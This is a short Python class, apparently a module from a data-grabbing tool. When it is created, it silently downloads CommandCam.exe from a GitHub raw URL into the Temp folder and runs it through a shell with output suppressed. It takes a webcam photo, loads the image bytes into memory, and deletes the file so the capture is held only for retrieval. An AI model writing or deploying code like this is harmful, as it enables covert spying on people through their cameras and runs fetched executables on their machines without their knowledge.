class WEBCAM:
    def __init__(self):
        self.WC_DATA = b""
        self.CommandCamPath =  os.path.join(os.getenv('Temp'), 'CommandCam.exe')
        self.CommandCamLink = 'https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe'
        self.generate()


    # Create screenshot from webcam

    def WebcamScreenshot(self,File, Delay=10, Camera=1):
        if not os.path.exists(self.CommandCamPath):
            urllib.request.urlretrieve(self.CommandCamLink, self.CommandCamPath)

        Command = f'@{self.CommandCamPath} /filename \"{File}\" /delay {Delay} /devnum {Camera} > NUL'
        subprocess.call(Command, shell=True)
    
    def generate(self):
        self.WebcamScreenshot("webcam.jpg")
        f = open("webcam.jpg",'rb')
        data = f.read()
        f.close()
        self.WC_DATA = data
        os.remove("webcam.jpg")
    def get_data(self):
        return self.WC_DATA
